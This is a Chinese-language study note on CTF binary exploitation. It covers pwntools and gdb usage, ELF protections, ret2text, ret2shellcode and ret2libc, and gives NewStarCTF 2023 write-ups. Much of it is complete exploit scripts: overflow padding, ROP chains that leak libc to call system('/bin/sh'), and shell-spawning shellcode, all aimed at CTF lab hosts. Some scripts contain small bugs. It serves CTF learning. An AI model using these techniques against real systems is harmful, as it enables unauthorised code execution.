什么是pwn

劫持程序流，权限提升

收集到一些去年蓝桥杯的比赛题目：https://cloud.tencent.com/developer/article/2391788

### 参考博客

[栈溢出漏洞与 ROP](https://www.uf4te.cn/posts/e8388866.html)

### PWN做题工具

（一） IDA Pro

也是逆向常用的工具之一了，这里不多说明了

（二） pwntools

基础用法

```
1、连接

本地：io=process("./文件名")

远程：io=remote("IP",端口)

2、解析文件

解析文件：elf=ELF("./文件名")

3、发送数据

io.send(str)

io.sendline(str)

io.sendafter("str1",str2)

4、接收数据

io.recv()

io.recvline()

io.recvuntil("str")
```

（三）pwngdb

![image-20240414164305785](../typora-user-images/image-20240414164305785.png)

```
设置断点

break <函数名>

break *<地址>

断点信息

info break       

删除断点

delete <标号>

运行

run

单步执行程序

step进入到函数内部去执行(call ...)

next会跳过函数执行下一条指令

stack <数字> 查看栈

显示内存中的内容

x/<n/f/u> <地址>
例 x/16wx 0xffffce30
16个值 w表示每四个字节一组 x表示16进制输出
x /16gx 0xffffce30
16个值 g表示8个字节一组 x表示16进制输出
```

![image-20240414165822337](../typora-user-images/image-20240414165822337.png)

quit 退出调试

continue 两个断点，第一个断点停下后，执行该命令，会跳过中间的调试，直接到第二个断点处





### 汇编基础

push指令 栈顶指针esp减少4字节；以字节为单位将寄存器数据(4字节，不足4字节以0补位)压入栈。

例    push 0x10;

​		push 0x20;

pop指令 栈顶指针指向栈中数据被取回寄存器；栈顶指针esp增加4字节。

例    pop eax;

​		pop ebx;







### 程序保护机制

checksec <文件名>     查看文件的保护机制

got表存储着函数的真实地址，

IDA中的函数地址是plt表中的地址，plt表转到got表找函数的真实地址

如果got表被改写了，就会混乱 

RELRD：Partial RELRD 该保护防止got表被改写

Canary found 对抗栈溢出的一种技术，检测canary是否被更改，被更改说明程序被攻击

![image-20240414180902012](../typora-user-images/image-20240414180902012.png)

NX保护    写入栈中的数据不可被执行，防止攻击者获取权限

![image-20240414181237640](../typora-user-images/image-20240414181237640.png)

无NX保护，栈拥有x(可执行权限)

![image-20240414181328404](../typora-user-images/image-20240414181328404.png)

有NX保护，只有可读可写权限，无可执行权限x

PIE保护  全局地址随机化，但第三位不会变，根据第三位寻找函数的地址



### 栈溢出基础

栈和栈帧

esp指向栈顶，ebp指向栈底

![image-20240415131847649](../typora-user-images/image-20240415131847649.png)

![image-20240415132202640](../typora-user-images/image-20240415132202640.png)

32位，跳过4个字节(函数地址)去寻参，得到参数，然后再跳回该函数地址

![image-20240415132330272](../typora-user-images/image-20240415132330272.png)

https://www.ruanyifeng.com/blog/2016/11/byte-order.html

![image-20240415132606415](../typora-user-images/image-20240415132606415.png)

![image-20240415132754475](../typora-user-images/image-20240415132754475.png)



 



### ROP

ROP全称为Return-oriented Programming,叫做返回导向编程，是一种基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构成恶意代码。

攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget),这些指令片段通常以ret指令结尾，即用ret指令实现指令片段执行流的衔接。

![image-20240415134012029](../typora-user-images/image-20240415134012029.png)

```
首先需要将构造的参数放到第一个参数所在的寄存器：RDI
可以__通过 pop rdi ; ret 指令将栈上的数据弹出到 RDI 寄存器来实现__

使用 ROPgadget --binary 文件名 | grep 'pop rdi' 进行寻找，获得 pop rdi ; ret 指令的地址
也可以使用 ROPgadget --binary 文件名 --only 'pop|ret' | grep pop 寻找全部可利用的寄存器指令

注意：
glibc2.27 以后引入 xmm 寄存器，记录程序状态，在执行 system() 函数时会执行 movaps 指令，要求 rsp 按 16 字节对齐，需要在进入 system() 函数之前加上一个 ret 指令的地址来平衡堆栈 （仅 64 位需要）

在进入 system() 函数之前，增加一个 ret 指令，因为 ret 指令不会改变程序的执行流
使用 ROPgadget 查找 ret 指令地址
ROPgadget --binary 文件名 --only 'ret'
```





### ret2text

#### 一 基本步骤

1.检查二进制文件的信息。(file <文件名> & checksec <文件名>)

2.打开ida查看二进制的反汇编代码。

3.编写exp脚本

4.开启靶机，进行远程连接。

5.利用exp脚本打通远程，获取flag

#### 二 原理一

​		将返回地址覆盖为程序.text段中已有的代码的地址，从而执行本身的代码由于我们要获得shell，二进制文件中本身就含有一个可以直接获取权限的函数，然后我们通过栈溢出漏洞，控制程序执行流，把返回地址覆盖为这个函数的地址让文件运行这个获取权限的函数，我们就可以拿到权限，进而获得flag

```python
# 简单样例
from pwn import *
# io=process('./file')   本地
p=remote('10.10.69.11',11456)
getshell_addr = 0x11456b7a
padding = 4+9

payload=b'a'*padding+p32(getshell_addr)

p.sendline(payload)
p.interactive()


```





#### 三 原理二

​		当二进制文件里没有直接可以获取权限的后门函数的时候，只有一个system()函数，然后在其它的地方有/bin/sh字符串，那么我们就可以把他们组合一下，变成system("/bin/sh"),来获取权限。

​		64位程序传参需要寄存器。

```
ROPgadget --binary x64 --only "pop|ret"
```

```python
from pwn import *

p=remote('10.10.69.19',11459)

padding=0x80+8

system_addr=0x400560
binsh_addr=0x601060

rdi_ret =0x000000000004007e3
payload = b'a'*padding + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)# 把binsh放进rdi
# system命令执行会去rdi寄存器找他的参数
p.sendline(payload)
p.interactive()

```







### ret2shellcode

#### 一 基本原理

​		shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。

​		通过栈溢出控制程序执行流，进而去执行写入shellcode代码的位置。

#### 二 bss段上的ret2shellcode

​		程序存在一个输入，可以把数据写入bss段，还有一个栈溢出漏洞可以让我们去控制程序执行流。那我们就可以把shellcode写入bss段，然后我们通过栈溢出漏洞去跳转到写入shellcode的位置，然后去执行，就可以获得权限。

![image-20240415184220433](../typora-user-images/image-20240415184220433.png)

```python
# 通过pwntools来得到shellcode
# 32位的shellcode
from pwn import *

shellcode=shellcraft.sh()
shellcode

asm(shellcode)   # 转换为可写入的字符形式

# 64位的shellcode
shellcode_64=shellcraft.amd64.sh()
asm(shellcode_64)
```

```python
# 例题
from pwn import *

p=remote("10.10.11.69",1226)

padding = 0x68+4
bss_addr = 0x0804a080

shellcode=asm(shellcraft.sh())

p.recvuntil('Please Input:\n')
p.sendline(shellcode)

payload = b'a'*(padding)+p32(bss_addr)

p.sendline(payload)
p.interactive()
```



#### 三 栈上的ret2shellcode

​		这一类有一个前提，需要把NX(栈不可执行)保护关闭。程序会把栈的地址输出，然后我们接收程序输出的栈地址，然后向栈中输入shellcode，通过栈溢出去跳到输入shellcode的位置，最终获取shell。

![image-20240415193520433](../typora-user-images/image-20240415193520433.png)

```python
# 简单样例
from pwn import *

context(os='linux',arch='amd64',log_level='debug') # 声明64位程序
context(arch='amd64')
p=remote('10.10.10.11',1289)

padding = 0x70+8
shellcode=asm(shellcraft.amd64.sh())

v4_addr=int(p.recvline().strip(),16) # 或者[:-1]删去\n 但是这里接收的是16进制字符串,int转换为整型

payload=shellcode.ljust(padding,'a') #用a填充到我们规定的字符长度padding,shellcode位于左边
# 相似的还有rjust()shellcode会位于右边，相当于右对齐的意思

payload=shellcode.ljust(padding,'a')+p64(v4_addr)
p.sendline(payload)
p.interactive()

```





### ret2libc

#### 一 什么是ret2libc

​		ret2libc这种攻击方式主要是针对动态链接(Dynamic linking)编译的程序，因为正常情况下是无法在程序中找到像system(),execve()这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。

​		使用ret2libc的原因

​		现代操作系统为了增加系统的安全性，采取了ASLR和NX等安全措施，以防止恶意代码的注入和执行。通过ret2libc攻击，攻击者可以利用已加载到内存中的标准C库函数，从而完成对系统的攻击。

#### 二 动态链接

​		什么是动态链接？

​		动态链接是指在程序装载时通过动态链接器将程序所需的所有动态链接(Dynamic linking library)装载至进程空间中(程序按照模块拆分成各个相对独立的部分),当程序运行时才将他们链接在一起形成一个完整程序的过程。

​		动态链接的优点

​		节约内存，共享库文件，灵活更新，减小可执行文件大小

![image-20240415202921228](../typora-user-images/image-20240415202921228.png)





#### 三 GOT表&PLT表

​		GOT&PLT

​		就是利用某个可打印东西的函数，打印出另一个函数在Got表中的地址，GOT(Global Offset Table,全局偏移表)是Linux ELF文件中用于定位全局变量和函数的一个表。

​		PLT(Procedure Linkage Table, 过程链接表)是Linux ELF文件中用于延迟绑定的表。

​		延迟绑定

​		所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定(包括符号查找、重定位等),如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。

​		plt表存的got表的地址，got表存的所需函数的地址，通过栈溢出构造rop链泄露出所需函数的真实地址，后续再用泄露出的真实地址减去libc中这个函数的地址，就可以得到libc的基地址，再通过libc的基地址加上我们所需函数在libc中的偏移地址，一般这里我们会选择system和binsh为我们所需要的函数。这样就能getshell了。

#### 四 ret2libc实操

​		**x32 payload结构**

![image-20240415205312251](../typora-user-images/image-20240415205312251.png)

cyclic 200 生成200个随机字符串 输入会报错，在pwndgb中以此来得到地址

cyclic -l<地址>   计算距离此地址长度，确定填充垃圾数据的个数











#### 		计算libc基址(固定公式)

​		函数在libc中的偏移地址可以用python pwntools中的函数libc.symbols['puts']函数进行计算。

​		libc基地址 = 函数实际地址-函数在libc库中的偏移地址

​		system_addr = libc基地址 + system在libc库中的偏移地址

​		puts_addr = libc基地址 + puts在libc库中的偏移地址

​		**x64 payload结构**

![image-20240415221420752](../typora-user-images/image-20240415221420752.png)

```python
# 简单例题
from pwn import *

r=remote('10.10.99.69',6666)

elf=ELF('./文件名')

padding = 120    # 前面确定的填充数据个数+指针8字节

puts_plt = elf.plt['puts']   # 导入puts的plt表
puts_got = elf.got['puts']   # 导入puts的got表

main_addr = 0x4006F6
pop_rdi_ret = 0x400783

payload=b'a'*padding+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
r.sendline(payload)

r.recvline()
puts_real = u64(r.recvline()[:-1].ljust(8,b'\x00'))
print(hex(puts_real))

# 在libc database search (后三位地址)中查询，下载好对应的libc库
# 将libc库导入，并且计算system和binsh地址(当然先算基地址)

libc=ELF('/libc文件')
libc_base = puts_real - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a'*padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(0xdeadbeef)   # 最后一个随便，因为此前执行就会getshell了

sleep(1)
r.sendline(payload2)
r.interactive()
```





### 稍有进阶--分割

### Ret2syscall









### NewStartCTF 2023 做题

#### Week1 ret2text

简单的栈溢出

检查二进制文件的信息

![image-20240420170753682](../typora-user-images/image-20240420170753682.png)

![image-20240420171345519](../typora-user-images/image-20240420171345519.png)

64位小端程序

```
Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
这个警告不知道怎么回事
```

用IDA打开

![image-20240420171846889](../typora-user-images/image-20240420171846889.png)

显然read函数是一个溢出点，buf到栈底距离0x20，再加上指针8字节

![image-20240420172212062](../typora-user-images/image-20240420172212062.png)

应该是要构造execve("/bin/sh")

![image-20240420172605890](../typora-user-images/image-20240420172605890.png)

0x000000000040101a

错了，有个后门函数，直接返回地址到那就行

exp

```python
from pwn import *

# p=process("./ret2text")
p=remote('node5.buuoj.cn',28803)

padding = 0x20+8


binsh_addr=0x4011fb


payload=b'a'*padding+p64(binsh_addr)

p.recvuntil('Show me your magic\n')
p.sendline(payload)
p.interactive()

```

![image-20240420183354591](../typora-user-images/image-20240420183354591.png)

有时候要recvuntil，有什么用呢？

[对pwntools之recv,send方法的理解](https://blog.csdn.net/hanqdi_/article/details/107164199)

recv可以理解为read读取，有时候需要从程序读取信息，需要先将前面的输出读取recv处理了

这样recv读取的才是我们需要的信息，否则就会读到前面的输出，相当于那个读取指针没动。









#### ezshellcode

![image-20240421104649368](../typora-user-images/image-20240421104649368.png)

![image-20240421113306733](../typora-user-images/image-20240421113306733.png)

IDA分析发现程序会直接执行我们发送的内容，所以我们直接发送生成的shellcode即可

exp

```python
from pwn import *

context(os='linux',arch='amd64')   # 64位程序要写
p=remote("node5.buuoj.cn",26000)

# padding = 0x8+8
# bss_addr=0x404070

shellcode=asm(shellcraft.amd64.sh())

p.sendline(shellcode)

# payload=b'a'*padding+p64(bss_addr)

# p.sendline(payload)
p.interactive()

```

获取flag

![image-20240421113214032](../typora-user-images/image-20240421113214032.png)





#### newstar shop

![image-20240421113738212](../typora-user-images/image-20240421113738212.png)

检查之后使用IDA打开

程序确实是一个商店购买的形式，选择1是展示售卖的商品，选择2是赚钱，选择3是惩罚我们即扣钱

一次扣除我们50且只有一次机会，IDA中发现我们的钱为0x64即100元

​		这道题的考点是**整数溢出**，因为第三个选项扣除钱时没有检查，所以我们可以让我们的money为负数，即很大的正整数。

exp

```python
# 总体过程是先买两次writeup，剩20，然后再去选择3减去50，这时我们的money就会成为很大的整数
# 买gift的话，也会给出提示
# You buy a newstar's gift
# That is the gift:
# What will happen when int transfer to unsigned int?
from pwn import *

# p=process("./newstar_shop")
p=remote("node5.buuoj.cn",25441)

for _ in range(2):
    p.sendline("1")
    p.sendline("2")
p.sendline("3")
p.sendline("1")
p.sendline("3")
p.interactive()

```

获取flag

![image-20240421140839834](../typora-user-images/image-20240421140839834.png)





#### p1eee

![image-20240421145251671](../typora-user-images/image-20240421145251671.png)

用IDA打开

![image-20240421154600666](../typora-user-images/image-20240421154600666.png)

存在后门函数

![image-20240421154834880](../typora-user-images/image-20240421154834880.png)

main函数存在栈溢出漏洞

由于存在PIE保护机制，地址每次都会变化，但是ELF是按页对齐，一页是0x1000，所以低三位十六进制的值不会改变 因为后门函数的地址与有溢出的函数的地址非常接近，所以只需修改最低一字节就能控制程序流到后门

![image-20240421154955151](../typora-user-images/image-20240421154955151.png)

地址非常接近

我们直接需要的就是system("/bin/sh")

![image-20240421155110878](../typora-user-images/image-20240421155110878.png)

是小端程序，读取地址时候，先读取低位，所以只需栈溢出到返回地址时覆盖低位地址为6c即可

exp

```python
from pwn import *

# p=process("./pwn")
p=remote("node5.buuoj.cn",28119)

padding=0x20+8

payload=b'a'*padding+p8(0x6c)

p.sendline(payload)
p.interactive()

```

![image-20240421160144274](../typora-user-images/image-20240421160144274.png)





#### Random

![image-20240421160757042](../typora-user-images/image-20240421160757042.png)

考点ctypes，pwntools

用IDA打开

![image-20240421162647740](../typora-user-images/image-20240421162647740.png)

可以看到使用了C语言的随机函数，由种子生成一个随机数

所以我们需要利用ctypes库在python代码中调用c语言函数，可以与程序生成同样的伪随机数

创建一个名为 random1.c 的C语言源代码文件

```c
#include <stdlib.h>
#include <time.h>

void set_seed()
{
    time_t seed=time(NULL);
    srand(seed);
}

int random_number()
{
    return rand;
}

```

编译这个C语言源文件为一个动态链接库（.so文件）

```shell
gcc -shared -o random1.so random1.c
```

exp

```python
from pwn import *
import ctypes

lib=ctypes.CDLL('./random1.so')
tob = lambda text: str(text).encode('utf-8')
while 1:
    try:
        sh=remote('node5.buuoj.cn',29162)

        lib.random_number.restype=ctypes.c_int

        lib.set_seed()

        result=lib.random_number()

        log.success("result=="+hex(result))

        sh.recvuntil(b'?\n')
        sh.sendline(str(result))

        sh.sendline(b'ls')
        answer=sh.revc(timeout=3)

        if b'sh' in answer:
            sh.close()
        elif b'Haha you are wrong' in answer:
            sh.close()
        else:
            sh.interactive()
    except:
        sh.close()
```

官方的这个exp莫名其妙的没结果

这里的随机数算法是C语言中的，随意的libc库都可以的，所以可以

```python
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
 
#p = process('./111')
p = remote('node5.buuoj.cn',29162)
elf = ELF('./pwn')
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
 
seed=libc.time(0)
libc.srand(seed)
num1=libc.rand()
 
p.sendline(str(num1).encode())
p.interactive()
```



![image-20240421192824346](../typora-user-images/image-20240421192824346.png)

有时候可以获取shell，有时候则不行

![image-20240421193009930](../typora-user-images/image-20240421193009930.png)

上面的就没能，下面的获取了shell





#### Week2

##### ret2libc

![image-20240421194558860](../typora-user-images/image-20240421194558860.png)

![image-20240421194755665](../typora-user-images/image-20240421194755665.png)

存在栈溢出漏洞，但是没有后门。

```
ROPgadget --binary ret2libc --only "pop|ret" | grep rdi
0x0000000000400763 : pop rdi ; ret

```

exp

```python
from pwn import *
from LibcSearcher import *


# p=process("./ret2libc")
p=remote('node5.buuoj.cn',27993)
elf=ELF('./ret2libc')
padding = 0x20+8


puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

ret=0x4006f1
main_addr=0x400698
pop_rdi_ret=0x0000000000400763
payload=b'a'*padding+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.recvuntil('again\n')
p.sendline(payload)
p.recvline()
puts_real=u64(p.recvline()[:-1].ljust(8,'\x00'))
print(hex(puts_real))


# libcsearcher
# libc = LibcSearcher("puts",puts_real)
# libc_base = puts_real - libc.dump("puts")
# system_addr = libc_base+libc.dump("system")
# binsh = libc_base+libc.dump("str_bin_sh")


# libc=ELF('libc6_2.27-3ubuntu1.5_amd64.so')
libc_base=puts_real-0x080970
system_addr=libc_base+0x04f420
binsh=libc_base+0x1b3d88

payload2=b'a'*padding +p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system_addr)

p.sendline(payload2)
p.interactive()
```

这里的ret到底是什么，顺序会影响的....用于保持堆栈平衡

```
cat flag
flag{9e71d0f2-452e-4fb1-9236-54ab31aebcae}
```

[PWN 中 64 位程序的堆栈平衡](https://www.uf4te.cn/posts/58163c9b.html)







##### canary

stack smashing detected

![image-20240424234448795](../typora-user-images/image-20240424234448795.png)













